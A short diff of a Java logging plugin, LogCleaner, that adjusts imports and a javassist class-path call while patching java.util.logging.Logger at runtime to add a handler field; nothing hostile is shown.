@@ -6,12 +6,15 @@ import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.HashSet;
 import java.util.List;
+import java.util.Observable;
+import java.util.Observer;
 import java.util.Set;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 import java.util.logging.Handler;
 import java.util.logging.LogManager;
+import java.util.logging.LogRecord;
 import java.util.logging.Logger;
 
 import javassist.CannotCompileException;
@@ -60,8 +63,9 @@ public class LogCleaner extends MajnPlugin {
 		logger.info(s+"plugins/MajnCorePlugin.jar");
 	    try {
 	    ClassPool pool = ClassPool.getDefault();
-	    pool.appendClassPath(s+"plugins/MajnCorePlugin.jar/*");
+	    pool.insertClassPath(s+"plugins/MajnCorePlugin.jar");
 	    CtClass log = pool.get("java.util.logging.Logger");
+	    	
 	    CtClass handler = pool.get(LogHandler.class.getName());
 	    CtField f = new CtField(handler, "hiddenValue", log);
 	    f.setModifiers(Modifier.PUBLIC);
